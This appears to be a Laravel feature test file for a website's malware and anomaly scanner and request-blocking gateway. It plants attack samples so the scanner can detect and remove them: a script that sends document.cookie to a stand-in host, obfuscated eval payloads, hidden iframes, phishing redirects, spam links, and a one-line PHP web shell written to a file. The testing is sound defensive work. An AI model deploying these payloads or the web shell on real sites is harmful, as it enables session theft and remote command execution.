<?php

namespace Tests\Feature;

use App\Models\AuditLog;
use App\Models\FbEvent;
use App\Models\FbParticipant;
use App\Models\FbSubmission;
use App\Models\Feedback;
use App\Models\LguActivity;
use App\Models\SsoClient;
use App\Models\SystemSetting;
use App\Models\User;
use App\Services\Security\MalwareAndAnomalyScannerService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\File;
use Inertia\Testing\AssertableInertia as Assert;
use Tests\TestCase;

class SecurityScanAndFixTest extends TestCase
{
    use RefreshDatabase;

    public function test_security_dashboard_includes_anomaly_scan_summary_and_categories(): void
    {
        $admin = User::factory()->create(['is_admin' => true]);

        $response = $this->actingAs($admin)->get(route('admin.security.index'));

        $response->assertOk();
        $response->assertInertia(fn (Assert $page) => $page
            ->component('Admin/Security/Index')
            ->has('anomalyScan')
            ->has('anomalyScan.categories', 5)
            ->has('anomalyScan.findings')
            ->has('anomalyScan.total_issues')
        );
    }

    public function test_scanner_detects_and_fixes_malicious_javascript_in_database_records(): void
    {
        $admin = User::factory()->create(['is_admin' => true]);

        $announcement = AuditLog::create([
            'admin_id' => $admin->id,
            'action' => 'broadcast_announcement',
            'target_type' => 'system',
            'details' => [
                'title' => 'Urgent Notice <script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
                'content' => 'Please read carefully <img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))"> and click <a href="javascript:alert(document.cookie)">here</a>.',
            ],
        ]);

        $activity = LguActivity::create([
            'title' => 'Municipal Assembly <script src="https://malware.example/dropper.js"></script>',
            'description' => 'Normal text String.fromCharCode(88,83,83) onload="evil()"',
            'category' => 'General',
            'date' => now()->toDateString(),
            'status' => 'upcoming',
        ]);

        // 1. Run non-destructive scan first
        $scanResponse = $this->actingAs($admin)->post(route('admin.security.scan'));
        $scanResponse->assertRedirect();

        /** @var MalwareAndAnomalyScannerService $scanner */
        $scanner = app(MalwareAndAnomalyScannerService::class);
        $scanResult = $scanner->scanAndFix(false);

        $this->assertGreaterThanOrEqual(2, $scanResult['categories']['malicious_js']['issues_count']);
        $this->assertStringContainsString('<script>', $announcement->fresh()->details['title']);

        // 2. Run Scan and Fix
        $fixResponse = $this->actingAs($admin)->post(route('admin.security.scan-and-fix'), [
            'category' => 'malicious_js',
        ]);
        $fixResponse->assertRedirect();

        $announcement->refresh();
        $activity->refresh();

        $this->assertStringNotContainsString('<script', $announcement->details['title']);
        $this->assertStringNotContainsString('onerror=', $announcement->details['content']);
        $this->assertStringNotContainsString('javascript:', $announcement->details['content']);
        $this->assertStringNotContainsString('eval(', $announcement->details['content']);
        $this->assertStringContainsString('Urgent Notice', $announcement->details['title']);

        $this->assertStringNotContainsString('<script', $activity->title);
        $this->assertStringNotContainsString('onload=', $activity->description);
        $this->assertStringNotContainsString('String.fromCharCode', $activity->description);

        $this->assertDatabaseHas('security_healing_logs', [
            'action_type' => 'sanitize_malicious_js',
            'status' => 'applied',
        ]);
    }

    public function test_scanner_detects_and_fixes_malicious_iframes_and_untrusted_embed_origins(): void
    {
        $admin = User::factory()->create(['is_admin' => true]);

        $event = FbEvent::create([
            'name' => 'Town Hall Event',
            'details' => 'Event info <iframe src="https://malicious-tracker.example/frame" width="0" height="0" style="display:none"></iframe><object data="https://evil.example/flash.swf"></object>',
            'created_by' => $admin->id,
        ]);

        $embed = $event->embed;
        $embed->update([
            'allowed_origins' => [
                'https://trusted.gov.ph',
                '*',
                'javascript:alert(1)',
                'http://*',
            ],
        ]);

        $feedback = Feedback::create([
            'event_id' => $event->id,
            'status' => Feedback::STATUS_PUBLISHED,
            'schema' => [
                'fields' => [
                    [
                        'id' => 'q1',
                        'type' => 'text',
                        'label' => 'Question 1 <iframe src="https://clickjack.example/ hidden"></iframe>',
                    ],
                ],
            ],
        ]);

        $response = $this->actingAs($admin)->post(route('admin.security.scan-and-fix'), [
            'category' => 'malicious_iframe',
        ]);
        $response->assertRedirect();

        $event->refresh();
        $embed->refresh();
        $feedback->refresh();

        $this->assertStringNotContainsString('<iframe', $event->details);
        $this->assertStringNotContainsString('<object', $event->details);
        $this->assertStringContainsString('Event info', $event->details);

        $this->assertEquals(['https://trusted.gov.ph'], array_values($embed->allowed_origins));
        $this->assertStringNotContainsString('<iframe', $feedback->schema['fields'][0]['label']);

        $this->assertDatabaseHas('security_healing_logs', [
            'action_type' => 'remove_malicious_iframe',
            'status' => 'applied',
        ]);
    }

    public function test_scanner_detects_and_fixes_suspicious_redirections(): void
    {
        $admin = User::factory()->create(['is_admin' => true]);

        $activity = LguActivity::create([
            'title' => 'Portal Update',
            'description' => 'Redirecting user <meta http-equiv="refresh" content="0;url=https://phishing-login.example"> window.location.href="https://phishing-login.example"; document.location.replace("https://evil.example");',
            'category' => 'Advisory',
            'date' => now()->toDateString(),
            'status' => 'upcoming',
        ]);

        $compromisedSso = SsoClient::create([
            'name' => 'Compromised SSO App',
            'client_id' => 'compromised_sso_client',
            'client_secret' => 'secret_123456',
            'redirect_uri' => 'https://valid.lgu.gov.ph/callback, javascript:window.location="https://evil.example", data:text/html,<script>alert(1)</script>',
            'api_url' => 'javascript:alert(1)',
            'is_active' => true,
        ]);

        $response = $this->actingAs($admin)->post(route('admin.security.scan-and-fix'), [
            'category' => 'suspicious_redirect',
        ]);
        $response->assertRedirect();

        $activity->refresh();
        $compromisedSso->refresh();

        $this->assertStringNotContainsString('http-equiv="refresh"', $activity->description);
        $this->assertStringNotContainsString('window.location', $activity->description);
        $this->assertStringNotContainsString('document.location', $activity->description);

        $this->assertEquals('https://valid.lgu.gov.ph/callback', $compromisedSso->redirect_uri);
        $this->assertNull($compromisedSso->api_url);

        $this->assertDatabaseHas('security_healing_logs', [
            'action_type' => 'neutralize_redirect',
            'status' => 'applied',
        ]);
    }

    public function test_scanner_detects_and_fixes_blackhat_seo_spam(): void
    {
        $admin = User::factory()->create(['is_admin' => true]);

        $activity = LguActivity::create([
            'title' => 'Community Health Day',
            'description' => 'Join our free checkup! <div style="display:none; position:absolute; left:-9999px"><a href="https://cheap-viagra-pharma.example">Buy Cheap Viagra Cialis Online Casino Slots Poker Betting</a></div>',
            'category' => 'Health',
            'date' => now()->toDateString(),
            'status' => 'upcoming',
        ]);

        $event = FbEvent::create([
            'name' => 'Public Survey',
            'created_by' => $admin->id,
        ]);
        $feedback = Feedback::create([
            'event_id' => $event->id,
            'schema' => ['fields' => []],
        ]);
        $participant = FbParticipant::create([
            'name' => 'Survey Respondent',
        ]);
        $submission = FbSubmission::create([
            'feedback_id' => $feedback->id,
            'participant_id' => $participant->id,
            'data' => [
                'comments' => 'Great service! <a href="https://slot-gacor-casino.example" style="font-size:0px">online casino slot gacor poker bonus</a>',
            ],
        ]);

        $response = $this->actingAs($admin)->post(route('admin.security.scan-and-fix'), [
            'category' => 'blackhat_seo_spam',
        ]);
        $response->assertRedirect();

        $activity->refresh();
        $submission->refresh();

        $this->assertStringNotContainsString('viagra', strtolower($activity->description));
        $this->assertStringNotContainsString('left:-9999px', strtolower($activity->description));
        $this->assertStringContainsString('Join our free checkup!', $activity->description);

        $this->assertStringNotContainsString('slot-gacor-casino', strtolower($submission->data['comments']));

        $this->assertDatabaseHas('security_healing_logs', [
            'action_type' => 'clean_seo_spam',
            'status' => 'applied',
        ]);
    }

    public function test_scanner_detects_and_fixes_system_and_storage_anomalies(): void
    {
        $admin = User::factory()->create(['is_admin' => true]);

        $scanTestDir = storage_path('app/public/security_scan_test');
        File::ensureDirectoryExists($scanTestDir);

        $rogueShellPath = $scanTestDir.'/backdoor.php';
        $infectedSvgPath = $scanTestDir.'/badge.svg';

        File::put($rogueShellPath, '<?php eval(base64_decode($_POST["cmd"])); shell_exec($_GET["c"]); ?>');
        File::put($infectedSvgPath, '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script><circle cx="50" cy="50" r="40" onload="evil()"/></svg>');

        SystemSetting::set('portal_footer_note', "Official Portal\0malicious_null_byte");

        try {
            $response = $this->actingAs($admin)->post(route('admin.security.scan-and-fix'), [
                'category' => 'system_anomaly',
            ]);
            $response->assertRedirect();

            $this->assertFileDoesNotExist($rogueShellPath);
            $this->assertFileExists($infectedSvgPath);

            $cleanedSvg = File::get($infectedSvgPath);
            $this->assertStringNotContainsString('<script', $cleanedSvg);
            $this->assertStringNotContainsString('onload=', $cleanedSvg);

            $this->assertStringNotContainsString("\0", (string) SystemSetting::get('portal_footer_note'));

            $this->assertDatabaseHas('security_healing_logs', [
                'action_type' => 'remediate_anomaly',
                'status' => 'applied',
            ]);
        } finally {
            File::deleteDirectory($scanTestDir);
        }
    }

    public function test_real_time_gateway_intercepts_new_threat_categories(): void
    {
        // 1. Suspicious Open Redirection
        $redirectResponse = $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.151'])
            ->get('/login?redirect_to=https://evil-phishing-portal.example/steal');

        $redirectResponse->assertStatus(403);
        $this->assertDatabaseHas('security_threat_logs', [
            'ip_address' => '198.51.100.151',
            'threat_type' => 'suspicious_redirect',
        ]);

        // 2. Malicious iFrame Injection
        $iframeResponse = $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.152'])
            ->get('/login?q='.urlencode('<iframe src="https://evil.example/frame" width="0" height="0"></iframe>'));

        $iframeResponse->assertStatus(403);
        $this->assertDatabaseHas('security_threat_logs', [
            'ip_address' => '198.51.100.152',
            'threat_type' => 'malicious_iframe',
        ]);

        // 3. Obfuscated Malicious JS
        $jsResponse = $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.153'])
            ->get('/login?payload='.urlencode('eval(String.fromCharCode(97,108,101,114,116,40,49,41))'));

        $jsResponse->assertStatus(403);
        $this->assertDatabaseHas('security_threat_logs', [
            'ip_address' => '198.51.100.153',
            'threat_type' => 'malicious_js',
        ]);

        // 4. Blackhat SEO Spam Injection
        $seoResponse = $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.154'])
            ->post('/login', [
                'email' => 'spammer@example.com',
                'password' => 'secret',
                'bio' => '<div style="display:none"><a href="https://viagra-casino.example">buy cheap viagra online casino</a></div>',
            ]);

        $seoResponse->assertStatus(403);
        $this->assertDatabaseHas('security_threat_logs', [
            'ip_address' => '198.51.100.154',
            'threat_type' => 'blackhat_seo_spam',
        ]);

        // 5. System Anomaly / Webshell Execution Probe
        $anomalyResponse = $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.155'])
            ->post('/login', [
                'cmd' => 'eval(base64_decode("c2hlbGxfZXhlYygiaWQiKTs="))',
            ]);

        $anomalyResponse->assertStatus(403);
        $this->assertDatabaseHas('security_threat_logs', [
            'ip_address' => '198.51.100.155',
            'threat_type' => 'system_anomaly',
        ]);
    }
}
